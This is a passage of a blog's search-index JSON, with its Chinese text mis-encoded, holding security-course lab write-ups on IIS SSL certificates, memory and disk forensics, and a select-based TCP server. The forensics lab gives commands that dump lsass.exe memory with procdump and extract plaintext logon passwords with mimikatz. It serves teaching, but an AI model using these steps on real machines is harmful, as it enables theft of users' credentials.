%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"åŸºäºWebçš„SSLè¿æ¥è®¾ç½®","slug":"åŸºäºWebçš„SSLè¿æ¥è®¾ç½®","date":"2020-12-21T20:14:42.000Z","updated":"2024-11-12T07:00:13.000Z","comments":true,"path":"2020/12/22/åŸºäºWebçš„SSLè¿æ¥è®¾ç½®/","permalink":"https://gryffinbit.top/2020/12/22/%E5%9F%BA%E4%BA%8EWeb%E7%9A%84SSL%E8%BF%9E%E6%8E%A5%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"å®éªŒå››ï¼šåŸºäºWebçš„SSLè¿æ¥è®¾ç½®å®éªŒç›®çš„ï¼šå­¦ä¹ åŸºäºWebçš„SSLè¿æ¥è®¾ç½®ï¼ŒåŠ æ·±SSLçš„ç†è§£ å®éªŒåŸç†ï¼šæ•°å­—è¯ä¹¦æ¦‚å¿µ å°†ç”¨æˆ·èº«ä»½IDä¸å…¶æ‰€æŒæœ‰çš„å…¬é’¥PKç»‘å®šï¼Œå†ç”±CAå¯¹è¯¥èº«ä»½åŠå¯¹åº”å…¬é’¥çš„ç»„åˆ{ID||PK}è¿›è¡Œæ•°å­—ç­¾åå¾—åˆ°Sï¼Œå°†{ç­¾åS||èº«ä»½ID||å…¬é’¥PK}åŠ ä»¥å­˜å‚¨ã€‚ å®éªŒå†…å®¹ï¼šWebæœåŠ¡å™¨è¯ä¹¦çš„ç”³è¯·å’Œå®‰è£…ï¼ˆæ­¥éª¤è¦ç‚¹ï¼‰ é…ç½®WebæœåŠ¡å™¨ï¼ˆç®¡ç†å·¥å…·ï¼ŒInternetä¿¡æ¯ç®¡ç†ï¼ŒIISï¼‰ æ–°å»ºç½‘ç«™ï¼ˆâ€œç½‘ç«™â€å³é”®ï¼Œæ³¨æ„IPåœ°å€é€‰æ‹©ï¼Œè¯»å†™ç­‰æƒé™ï¼‰ æš‚åœæ–°å»ºçš„ç½‘ç«™ï¼Œå¯ç”¨æ ¹CAé»˜è®¤ç½‘ç«™ æ–°å»ºç½‘ç«™å±æ€§ï¼Œè¯ä¹¦æœåŠ¡å‘å¯¼ç”Ÿæˆâ€œè¯ä¹¦ç”³è¯·ä¹¦â€ Webè¯ä¹¦æœåŠ¡å‘å¯¼ å†åœ¨å³é”®å±æ€§ä¸­ï¼Œç›®å½•å®‰å…¨æ€§ï¼Œè¯ä¹¦æœåŠ¡å™¨ ä¼ä¸šæ ¹CAIP&#x2F;certsrvï¼Œé€’äº¤è¯ä¹¦ç”³è¯·ä¹¦ï¼Œæ ¹CAç”Ÿæˆè¯ä¹¦å¹¶ä¸‹è½½ã€‚ æ–°å»ºç½‘ç«™å±æ€§ï¼Œå¯ç”¨Webè¯ä¹¦ å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦ å®éªŒç¯å¢ƒï¼šå®¿ä¸»æœºï¼š macOS Catalina è™šæ‹Ÿæœºï¼šWindows Sever 2003 å®éªŒè¿‡ç¨‹ï¼š1.æ–°å»ºWebæœåŠ¡å™¨ç½‘ç«™é¢„å…ˆé…ç½®ï¼šé…ç½®æœåŠ¡å™¨ï¼Œå¹¶å¼€å¯IISæœåŠ¡ ç®¡ç†å·¥å…·â†’Internetä¿¡æ¯ç®¡ç†â†’IIS æ–°å»ºç½‘ç«™ï¼ˆâ€œç½‘ç«™â€å³é”®ï¼Œæ³¨æ„IPåœ°å€é€‰æ‹©ï¼Œè¯»å†™ç­‰æƒé™ï¼‰ å±€åŸŸç½‘å¡IP 2. WebæœåŠ¡å™¨ç”Ÿæˆâ€œè¯ä¹¦ç”³è¯·ä¹¦æ–°å»ºç½‘ç«™å±æ€§ï¼Œè¯ä¹¦æœåŠ¡å‘å¯¼ç”Ÿæˆâ€œè¯ä¹¦ç”³è¯·ä¹¦â€ï¼Œè¿›å…¥Webè¯ä¹¦æœåŠ¡å‘å¯¼ å³é”®å±æ€§â†’ç›®å½•å®‰å…¨æ€§â†’æœåŠ¡å™¨è¯ä¹¦ IISè¯ä¹¦å‘å¯¼ æ–°å»ºè¯ä¹¦â†’ç°åœ¨å‡†å¤‡è¯ä¹¦è¯·æ±‚ï¼ˆè¯ä¹¦åç§°ã€éƒ¨é—¨ï¼‰â†’ç”Ÿæˆâ€œè¯ä¹¦è¯·æ±‚æ–‡ä»¶â€ï¼ˆç”¨äºå‘æ ¹CAç”³è¯·è¯ä¹¦ï¼‰ 3. é€’äº¤â€œè¯ä¹¦ç”³è¯·ä¹¦â€å¹¶è·å–è¯ä¹¦ä¼ä¸šæ ¹CAIP&#x2F;certsrvï¼Œé€’äº¤è¯ä¹¦è¯·æ±‚æ–‡ä»¶ï¼Œæ ¹CAç”Ÿæˆè¯ä¹¦å¹¶ä¸‹è½½ã€‚ é«˜çº§è¯ä¹¦ç”³è¯·â†’ä½¿ç”¨base64ç¼–ç â†’å¤åˆ¶è¯ä¹¦è¯·æ±‚æ–‡ä»¶å†…å®¹â†’ç²˜è´´è¿›ç½‘é¡µç©ºç™½â†’æäº¤ ä¼ä¸šæ ¹CAIP&#x2F;certsrvï¼Œé€’äº¤è¯ä¹¦è¯·æ±‚æ–‡ä»¶ï¼Œæ ¹CAç”Ÿæˆè¯ä¹¦å¹¶ä¸‹è½½ã€‚ è¯ä¹¦é¢å‘â†’ä¸‹è½½æœ¬åœ° 4. åº”ç”¨WebæœåŠ¡å™¨è¯ä¹¦æ–°å»ºç½‘ç«™å±æ€§ï¼Œå¯ç”¨Webè¯ä¹¦ å±æ€§ä¸­â†’ç›®å½•å®‰å…¨æ€§â†’è¯ä¹¦æœåŠ¡å™¨â†’å¤„ç†æŒ‚èµ·è¯·æ±‚å¹¶å®‰è£…è¯ä¹¦â†’ç¡®è®¤SSLç«¯å£443 è¯ä¹¦æ‘˜è¦ï¼Œå±æ€§å¯ä»¥æŸ¥çœ‹ å±æ€§ä¸­â†’ç›®å½•å®‰å…¨æ€§â†’ç¼–è¾‘â€œè¦æ±‚å®‰å…¨é€šé“â€â†’å®¢æˆ·ç«¯â€œå¿½ç•¥å®¢æˆ·ç«¯è¯ä¹¦â€ ï¼ˆå®¢æˆ·ç«¯æ‹¥æœ‰è¯ä¹¦ä¹‹åï¼Œå¯ä»¥æ¥å—æˆ–è¦æ±‚ï¼‰ 5. å®¢æˆ·ç«¯éªŒè¯WebæœåŠ¡å™¨è¯ä¹¦æš‚åœæ ¹CAé»˜è®¤ç½‘ç«™ï¼Œå¯ç”¨æ–°å»ºçš„ç½‘ç«™ å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œhttp:&#x2F;&#x2F;ä¼ä¸šæ ¹CAIPï¼Œå—åˆ°SSLæé†’ å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œhttps:&#x2F;&#x2F;ä¼ä¸šæ ¹CAIP å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦ å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œhttps:&#x2F;&#x2F;ä¼ä¸šæ ¹CAIP","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œå®‰å…¨æŠ€æœ¯","slug":"å®éªŒ/ç½‘ç»œå®‰å…¨æŠ€æœ¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://gryffinbit.top/tags/SSL/"}],"author":"Gryffinbit"},{"title":"æ´»å–è¯å’Œæ­»å–è¯","slug":"æ´»å–è¯å’Œæ­»å–è¯","date":"2020-12-19T09:34:51.000Z","updated":"2024-11-12T07:00:15.000Z","comments":true,"path":"2020/12/19/æ´»å–è¯å’Œæ­»å–è¯/","permalink":"https://gryffinbit.top/2020/12/19/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/","excerpt":"","text":"æ´»å–è¯å’Œæ­»å–è¯å®éªŒè½¯ä»¶ä¸‹è½½https://gryffinbit.lanzous.com/iZMymji46yb é•œåƒä¸‹è½½ï¼š é“¾æ¥: https://pan.baidu.com/s/1u4yOjEbeioWxBukyKXzq-A å¯†ç : b09h kali-linux-2020.2-live-amd64 å®éªŒç›®çš„1.ç†è§£â€œæ´»å–è¯â€å’Œâ€œæ­»å–è¯â€ä¸¤ç±»æŠ€æœ¯çš„å·®åˆ«å’Œåº”ç”¨åœºåˆ 2.æŒæ¡â€œæ´»å–è¯â€å’Œâ€œæ­»å–è¯â€åŸºæœ¬å·¥å…·çš„ä½¿ç”¨æ–¹æ³• å®éªŒç¯å¢ƒï¼škali-Linux debian8 Windows 7 professional å®éªŒå†…å®¹ï¼šä¸€.æ´»å–è¯: ä»å†…å­˜è¿˜åŸæ–‡å­— ä»å†…å­˜è¿˜åŸå›¾ç‰‡ ä»å†…å­˜ä¸­æå–æ˜æ–‡å¯†ç  äºŒ.æ­»å–è¯: ä½¿ç”¨Kali live åˆ¶ä½œå…‰ç›˜é•œåƒ ä½¿ç”¨ Autopsy å¯¹ç¡¬ç›˜é•œåƒè¿›è¡Œåˆ†æ å®éªŒè¿‡ç¨‹ï¼šå®éªŒ 1:ä½¿ç”¨ procdump+ strings ä»å†…å­˜ä¸­è¿˜åŸæ–‡å­—ğŸ‘‰ Win7 ç³»ç»Ÿä¸‹è¿›è¡Œå®éªŒï¼Œä»¥è®°äº‹æœ¬ç¨‹åºä¸ºä¾‹ã€‚ ğŸ‘‰æ‰“å¼€ä¸€ä¸ªè®°äº‹æœ¬ï¼ŒæŸ¥çœ‹è¯¥ç¨‹åºçš„æ˜ åƒåå’ŒPIDç­‰ä¿¡æ¯ã€‚æ‰“å¼€cmdï¼Œè¾“å…¥å‘½ä»¤ã€‚ç„¶åæ‰¾åˆ°notepad.exe 1tasklist ğŸ‘‰ä½¿ç”¨ procdump å·¥å…·æå– notepad ç¨‹åºåœ¨å†…å­˜ä¸­çš„é•œåƒ ğŸ’¡cd åˆ°procdump64.exe æ‰€åœ¨æ–‡ä»¶å¤¹ 1procdump64.exe -ma notepad.exe notepad.dmp ğŸ‘‰ä½¿ç”¨ strings å·¥å…·æå–å‡ºå…¶ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ã€‚ 1strings.exe notepad.dmp &gt; result.txt ğŸ’¡è¿™ä¸ä»…é€‚ç”¨äº notepad ç¨‹åºï¼Œåªè¦å½“å‰ç³»ç»Ÿä¸­æ­£åœ¨ä½¿ç”¨çš„æ–‡å­—å¤„ç†è½¯ä»¶ï¼Œå¦‚:wordã€ outlook(é‚®ä»¶)ç­‰ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„æ–¹æ³• dump å†…å­˜ä¸­æ•°æ®å†…å®¹ã€‚ å®éªŒ 2:ä»å†…å­˜è¿˜åŸå›¾ç‰‡ ä»å›¾ç”»å·¥å…·ä¸­æ‰“å¼€ ğŸ‘‰ç”¨ç”»å›¾å·¥å…·æ‰“å¼€ä¸€å¹…å›¾ç‰‡ï¼Œç”»å›¾å·¥å…·ç¨‹åºåæ˜¯â€œmspaint.exeâ€ ğŸ‘‰ç”¨procdumpæŠ“å–å†…å­˜ä¸­çš„å†…å®¹ 1procdump64.exe -ma mspaint.exe mspaint.dmp ğŸ‘‰åˆ†æå¤„ç† mspaint.dmp æ–‡ä»¶è¿˜æ˜¯éœ€è¦åœ¨ kali ç³»ç»Ÿä¸­è¿›è¡Œï¼Œå°†å…¶æ‹·è´åˆ° kali ç³»ç»Ÿ: ğŸ‘‰kali ä¸‹æå–å›¾åƒä¿¡æ¯ä½¿ç”¨çš„å·¥å…·æ˜¯ gimp(photoshop çš„ linux ç‰ˆ) ä¸ºé¿å…æ‰¾ä¸åˆ°gimpåŒ…ï¼Œå…ˆè¿›è¡Œä¿®å¤ 12apt --fix-broken install apt-get install gimp ğŸ‘‰ç»™mspaint.dmp æ”¹åä¸º mspaint.data gimpä¸èƒ½ç›´æ¥æ‰“å¼€dmpæ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥æ‰“å¼€dataæ–‡ä»¶ï¼Œä¸¤ç§ç±»å‹æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œ æˆ‘ä»¬æŠŠæŠ“å–çš„ mspaint.dmp æ”¹åä¸º mspaint.data 1mv mspaint.dmp mspaint.data ğŸ‘‰ç„¶åç”¨ gimp æ‰“å¼€ mspaint.data æ‰“å¼€åæ˜¾ç¤ºçš„å›¾ç‰‡æ˜¯ä¸€å›¢æ··ä¹±çš„åƒç´ ç‚¹ï¼Œé€šè¿‡è°ƒèŠ‚å®½åº¦ã€é«˜åº¦ä»¥åŠä½ç§»ä¸‰ä¸ªå‚æ•°ï¼Œä»æ··ä¹±ä¸­å¯»æ‰¾å¯èƒ½çš„å›¾åƒ ğŸ’¡å¦‚æœæˆ‘ä»¬çŸ¥é“å…ƒç´ å›¾ç‰‡çš„å®½åº¦å’Œé«˜åº¦ä¿¡æ¯ï¼Œå¯ä»¥å…ˆè®¾å®šå¥½è¿™ä¸¤ä¸ªå‚æ•°ï¼Œ è°ƒèŠ‚ä½ç§»ä¸€ä¸ªå‚æ•°å°±å¯ä»¥äº†ã€‚ï¼ˆä½œå¼Šæ–¹æ³•) å·¦ä¸Šè§’æ‰¾åˆ°gimpï¼Œè¿è¡Œ æ‰“å¼€dataæ–‡ä»¶ è°ƒæ•´å®½åº¦ã€é«˜åº¦ï¼ˆå·²çŸ¥è¿™ä¸ªå›¾ç‰‡æ˜¯3840*2160ï¼‰ è°ƒæ•´ä½ç§»åˆ°åˆé€‚çš„ä½ç½®ï¼Œæ˜¾ç¤ºå®Œæ•´å›¾ç‰‡ ä»è¿œç¨‹æ¡Œé¢æ‰“å¼€ ğŸ‘‰åœ¨ç›®æ ‡ç³»ç»Ÿä¸­å¯åŠ¨ mstsc(è¿œç¨‹æ¡Œé¢ç¨‹åº)å¹¶ç™»é™†ä¸€å°è¿œç¨‹è®¡ç®—æœº ğŸ‘‰æŠ“å–è¿œç¨‹æ¡Œé¢çš„å†…å­˜æ•°æ® å¦‚æœè¿æ¥ä¸Šè¿œç¨‹è®¡ç®—æœºåï¼Œè¿œç¨‹è®¡ç®—æœºçš„æ¡Œé¢éƒ½æ˜¯ä»¥å›¾åƒçš„å½¢å¼åœ¨æœ¬åœ°ç›®æ ‡ç³»ç»Ÿçš„ mstsc ç¨‹åºä¸­æ˜¾ç¤ºå’Œå¤„ç†ï¼Œç°åœ¨æˆ‘ä»¬æŠ“å–è¿œç¨‹æ¡Œé¢çš„å†…å­˜æ•°æ®: 1procdump64.exe -ma mstsc.exe mstsc.dmp ğŸ‘‰æŠŠ mstsc.dmp æ‹·è´åˆ° kali ç³»ç»Ÿä¸­è¿›è¡Œå¤„ç† å¤„ç†è¿‡ç¨‹ä¸å‰é¢çš„ä¾‹å­æ˜¯ä¸€æ ·çš„ï¼Œé€šè¿‡è°ƒæ•´å‚æ•°ï¼Œå¯ä»¥è·å–ä¸‹å›¾çš„å›¾åƒ: å®éªŒ3: ä»å†…å­˜ä¸­æå–æ˜æ–‡å¯†ç ğŸ‘‰ä»ç®¡ç†ç”¨æˆ·ä»¤ç‰Œç¨‹åºçš„å†…å­˜æå–ç”¨æˆ·å¯†ç  Windowsç³»ç»Ÿä¸­å½“ç”¨æˆ·ç™»é™†åï¼Œç³»ç»Ÿä¼šå¯åŠ¨ä¸€ä¸ªå«åšlsass.exeçš„ç¨‹åºï¼Œç®¡ç†ç”¨æˆ·ä»¤ç‰Œï¼Œåœ¨ lsass ç¨‹åºä¸­ä¼šå­˜å‚¨æœ‰ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œæˆ‘ä»¬ç°åœ¨å°è¯•ä½¿ç”¨ procdump ä» è¿™ä¸ªç¨‹åºçš„å†…å­˜ä¸­æå–ç”¨æˆ·çš„å¯†ç ã€‚ ğŸ’¡æ³¨æ„è¦ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€ç»ˆç«¯ç¨‹åº 1procdump64.exe -ma lsass.exe lsass.dmp ğŸ‘‰è·å–åˆ° dmp æ–‡ä»¶åï¼Œä½¿ç”¨ mimikatz è¿›è¡Œå¯†ç æå–ã€‚ æŠŠ lsass.dmp æ–‡ä»¶æ‹·è´åˆ° mimikatz.exe æ‰€åœ¨æ–‡ä»¶å¤¹ï¼ŒåŒå‡»æ‰“å¼€ mimikatz.exe ç¨‹åºã€‚ è¾“å…¥::å›è½¦ï¼Œå¯ä»¥æŸ¥çœ‹ mimikatz æ‰€æœ‰çš„æ¨¡å—ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„æ¨¡å—æ˜¯ sekurlsaã€‚ åœ¨ä¾æ¬¡ä½¿ç”¨å‘½ä»¤ 12sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords å°±å¯ä»¥å°†ç”¨æˆ·å¯†ç æå–å‡ºæ¥ å®éªŒ4:æ­»å–è¯ ä½¿ç”¨ Live ç‰ˆ Kali ç³»ç»Ÿä¸­çš„ Guymager æ¥åˆ›å»ºä¸€å° Win7 è™šæ‹Ÿæœºçš„ç¡¬ç›˜é•œåƒ ğŸ‘‰é¦–å…ˆè¦å°† Live ç‰ˆ Kali çš„ iso æ–‡ä»¶è£…è½½åˆ° Win7 è™šæ‹Ÿæœº ğŸ‘‰å¯åŠ¨è™šæ‹Ÿæœºï¼Œè®©ç”µè„‘ä»å…‰ç›˜å¯åŠ¨ï¼Œè¿›å…¥ Live ç‰ˆçš„ Kali ç³»ç»Ÿã€‚ ğŸ‘‰é€‰æ‹©è¿›å…¥ kali(å–è¯æ¨¡å¼)ç³»ç»Ÿ ğŸ‘‰æ‰“å¼€ guymager ç¨‹åº: å³é”®ï¼Œé€‰æ‹©acquire image é€‰æ‹©startå¼€å§‹å–è¯è¿›ç¨‹ã€‚ ä½¿ç”¨ Autopsy å¯¹ç¡¬ç›˜é•œåƒè¿›è¡Œåˆ†æ Autopsy æ˜¯ Kali Linux é¢„å®‰è£…çš„ä¸€æ¬¾ç£ç›˜é•œåƒåˆ†æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥å¯¹ç£ç›˜é•œåƒ çš„å·å’Œæ–‡ä»¶ç³»ç»Ÿè¿›è¡Œåˆ†æï¼Œæ”¯æŒ Unix å’Œ Windows ç³»ç»Ÿã€‚Autopsy æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œ å·¥å…·ï¼Œä¹Ÿæä¾›åŸºäºæµè§ˆå™¨çš„å›¾å½¢ç•Œé¢ã€‚ç”¨æˆ·ä½¿ç”¨è¯¥å·¥å…·ï¼Œå¯ä»¥å¾ˆè½»æ¾æµè§ˆé•œåƒä¸­çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œç”šè‡³æ˜¯å·²åˆ é™¤çš„æ–‡ä»¶ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·æä¾›å¼ºå¤§çš„åˆ†æåŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·ç›´æ¥åˆ†æç£ç›˜å—ï¼Œå…³é”®å­—æœç´¢ï¼Œæ–‡ä»¶åˆ†ç±»è¿‡æ»¤ã€‚é’ˆå¯¹æ•°å­—å–è¯ï¼Œè¯¥å·¥å…·æä¾› é•œåƒå®Œæ•´æ€§éªŒè¯ã€æ–‡ä»¶ MD5 æ¯”å¯¹ã€æ–‡ä»¶æ“ä½œæ—¶é—´è¡¨ã€æŠ¥å‘Šç”ŸæˆåŠŸèƒ½ã€‚ è¿™é‡Œæˆ‘ä»¬ä»‹ç» Autopsy åŸºäºæµè§ˆå™¨-æœåŠ¡å™¨æ¶æ„çš„ä½¿ç”¨æ–¹å¼ã€‚ ğŸ‘‰åœ¨ kali ç»ˆç«¯è¾“å…¥ autopsy å›è½¦ï¼Œä¼šå¯åŠ¨ autopsy çš„æœåŠ¡å™¨ç«¯ ğŸ‘‰æ‰“å¼€ç½‘é¡µ è¯¥æœåŠ¡å™¨åœ¨ç«¯å£ 9999 è¿›è¡Œä¾¦å¬ï¼Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®ã€‚åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ä¸Šé¢ç½‘å€ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢æ“ä½œç•Œé¢: ğŸ‘‰æ–°å»ºcase è¿™æ¬¾è½¯ä»¶æ˜¯æŒ‰ç…§ç½‘ç»œçŠ¯ç½ªå–è¯çš„è¿‡ç¨‹æ¥è®¾è®¡çš„ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯ä»¥ case ä½œä¸ºåŸºæœ¬ å•å…ƒï¼Œé¦–å…ˆè¦å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ case: ç‚¹å‡» NewCase åï¼Œä¼šæç¤ºæ–°çš„ case åˆ›å»ºå¥½äº†ï¼Œæ˜¾ç¤ºæ–‡ä»¶ç›®å½•å’Œé…ç½®æ–‡ä»¶å­˜æ”¾ä½ç½® ğŸ‘‰ä¸ºè¿™ä¸ª case æ·»åŠ ä¸»æœºä¿¡æ¯ ç‚¹å‡» ADD HOST åï¼Œåœ¨ä¸‹ä¸ªé¡µé¢å®Œå–„ä¸»æœºä¿¡æ¯:(è¿™äº›ä¿¡æ¯ä¸æ˜¯å¿…å¡«çš„) ä¸‹é¢æ˜¯å°†ç¡¬ç›˜é•œåƒä¸Šä¼ åˆ°æ–°å»ºçš„ case ä¸­ï¼Œç‚¹å‡» ADD IMAGE: (åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ç½‘ä¸Šçš„ä¸€ä¸ªé•œåƒâ€”â€”è®¡ç®—æœºå–è¯å‚è€ƒæ•°æ®é›†ï¼Œä¸‹è½½ç½‘ å€:http://www.cfreds.nist.gov/Controlv1_0/control.dd) control.ddåªæ˜¯ä¸€ä¸ªç£ç›˜çš„åˆ†åŒºã€‚ æ³¨æ„ï¼Œå°†control.ddæ”¾åœ¨è¿™é‡Œå¡«å†™çš„ä½ç½®ï¼Œrootæ–‡ä»¶ä¸‹ Import Method ä¸‰ç§æ–¹å¼:symlink(é•œåƒæ”¾åœ¨åŸä½ç½®&#x2F;root ä¸­ï¼Œå¦‚é•œåƒæ–‡ä»¶ç§»åŠ¨ï¼Œ è¿™ä¸ª case å°±æ— æ³•å†æ‰¾åˆ°è¿™ä¸ªé•œåƒç»§ç»­è¿›è¡Œåˆ†æäº†)ï¼ŒMove(æŠŠé•œåƒä»åŸä½ç½®å‰ª åˆ‡åˆ° Autopsy çš„ evidence locker ä¸­ï¼Œevidence locker å¯ä»¥å¯¹å…¶ä¸­çš„æ•°æ®è¿›è¡Œå†™ä¿ æŠ¤ï¼Œä½†æ˜¯å¦‚æœ move è¿‡ç¨‹ä¸­å¦‚æœæ–­ç”µï¼Œé•œåƒä¼šè¢«æŸå)ï¼ŒCopy(æŠŠé•œåƒä»æ‹·è´ä¸€ ä»½åˆ° Autopsy çš„ evidence locker ä¸­ï¼Œæ¯”è¾ƒä¿é™©ï¼Œä¸€èˆ¬é€‰ copy) æ›´å¤šä¿¡æ¯è¯·è®¿é—® http://www.cfreds.nist.gov","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"å–è¯","slug":"å–è¯","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"åŸºäºselectæ¨¡å‹çš„TCPæœåŠ¡å™¨","slug":"åŸºäºselectæ¨¡å‹çš„TCPæœåŠ¡å™¨","date":"2020-12-18T16:22:59.000Z","updated":"2024-11-12T07:00:14.000Z","comments":true,"path":"2020/12/19/åŸºäºselectæ¨¡å‹çš„TCPæœåŠ¡å™¨/","permalink":"https://gryffinbit.top/2020/12/19/%E5%9F%BA%E4%BA%8Eselect%E6%A8%A1%E5%9E%8B%E7%9A%84TCP%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"åŸºäºselectæ¨¡å‹çš„TCPæœåŠ¡å™¨å®éªŒå·¥ç¨‹æ–‡ä»¶ä¸‹è½½https://gryffinbit.lanzous.com/iSR7Gjhg68b å®éªŒç›®çš„ ç†Ÿæ‚‰éé˜»å¡å¥—æ¥å­—çš„å·¥ä½œæ¨¡å¼ ç†è§£selectæ¨¡å‹çš„åŸºæœ¬æ€è·¯ å®éªŒç¯å¢ƒWindows10 x64ï¼ŒVisual Studio 2017 å®éªŒè¦æ±‚å°†ç¬¬ä¸‰ç« çš„ç‚¹å¯¹ç‚¹çš„C&#x2F;Sæ¨¡å‹æ”¹ç”¨selectæ¨¡å‹ã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘ä»¬åªæ˜¯å…³æ³¨å¯è¯»å¥—æ¥å­—ï¼Œä¹Ÿå°±æ˜¯selectå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªå‚æ•°å‡ä¸ºNULLã€‚ å®éªŒåŸç†ï¼ˆæ¨¡å‹ï¼‰selectçš„å‡½æ•°1234567int select( int nfds, fd_set FAR* readfds, fd_set FAR* writefds, fd_set FAR* exceptfds, const struct timeval FAR* timeout); fd_setæ•°æ®ç±»å‹ï¼Œä»£è¡¨ç€ä¸€ç³»åˆ—ç‰¹å®šå¥—æ¥å­—çš„é›†åˆã€‚ nfds ï¼š ä¸ºä¿æŒä¸æ—©æœŸå¥—æ¥å­—åº”ç”¨ç¨‹åºå…¼å®¹ã€‚ readfdsï¼š ç”¨äºæ£€æŸ¥å¯è¯»æ€§ã€‚è¯¥é›†åˆåŒ…æ‹¬æƒ³è¦æ£€æŸ¥æ˜¯å¦ç¬¦åˆä¸‹è¿°ä»»ä½•ä¸€ä¸ªæ¡ä»¶çš„å¥—æ¥å­—ã€‚ æœ‰æ•°æ®åˆ°è¾¾ï¼Œå¯ä»¥è¯»å…¥ è¿æ¥å·²å…³é—­ã€é‡è®¾æˆ–ä¸­æ­¢ å‡å¦‚å·²è°ƒç”¨äº†listenï¼Œè€Œä¸”ä¸€ä¸ªè¿æ¥æ­£åœ¨å»ºç«‹ï¼Œé‚£ä¹ˆacceptå‡½æ•°è°ƒç”¨ä¼šæˆåŠŸã€‚ wirtefdsï¼šç”¨äºæ£€æŸ¥å¯å†™æ€§ã€‚è¯¥é›†åˆåŒ…æ‹¬æƒ³è¦æ£€æŸ¥æ˜¯å¦ç¬¦åˆä¸‹è¿°ä»»ä½•ä¸€ä¸ªæ¡ä»¶çš„å¥—æ¥å­—ã€‚ å‘é€ç¼“å†²åŒºå·²ç©ºï¼Œå¯ä»¥å‘é€æ•°æ®ã€‚ å¦‚æœå·²å®Œæˆäº†å¯¹ä¸€ä¸ªéé”å®šè¿æ¥è°ƒç”¨çš„å¤„ç†ï¼Œè¿æ¥å°±ä¼šæˆåŠŸã€‚ exceptfdsï¼šç”¨äºæ£€æŸ¥å¸¦å¤–æ•°æ®ã€‚è¯¥é›†åˆåŒ…æ‹¬æƒ³è¦æ£€æŸ¥æ˜¯å¦ç¬¦åˆä¸‹è¿°ä»»ä½•ä¸€ä¸ªæ¡ä»¶çš„å¥—æ¥å­—ã€‚ å‡å¦‚å·²å®Œæˆäº†å¯¹ä¸€ä¸ªéé”å®šè¿æ¥è°ƒç”¨çš„å¤„ç†ï¼Œè¿æ¥å°è¯•å°±ä¼šå¤±è´¥ã€‚ æœ‰å¸¦å¤–ï¼ˆout-of-bandï¼ŒOOBï¼‰æ•°æ®å¯ä¾›è¯»å– timeoutï¼šæ˜¯ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªtimevalç»“æ„çš„æŒ‡é’ˆï¼Œç”¨äºå†³å®šselectç­‰å¾…I&#x2F;Oæ“ä½œå®Œæˆçš„æœ€é•¿æ—¶é—´ã€‚å¦‚æœtimeoutæ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œé‚£ä¹ˆselectè°ƒç”¨ä¼šæ— é™åˆ¶åœ°ç­‰å¾…ä¸‹å»ï¼Œç›´åˆ°è‡³å°‘æœ‰ä¸€ä¸ªå¥—æ¥å­—ç¬¦åˆåˆ¶å®šçš„æ¡ä»¶åæ‰ç»“æŸã€‚ timevalç»“æ„çš„å®šä¹‰1234strcut timeval&#123; long tv_sec; //ä»¥ç§’ä¸ºå•ä½æŒ‡å®šç­‰å¾…æ—¶é—´ long tv_usec; //ä»¥æ¯«ç§’ä¸ºå•ä½æŒ‡å®šç­‰å¾…æ—¶é—´&#125;; selectæ¨¡å‹çš„æ“ä½œæ­¥éª¤ç”¨selectæ“ä½œä¸€ä¸ªæˆ–å¤šä¸ªå¥—æ¥å­—å¥æŸ„ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸‹è¿°æ­¥éª¤ã€‚ 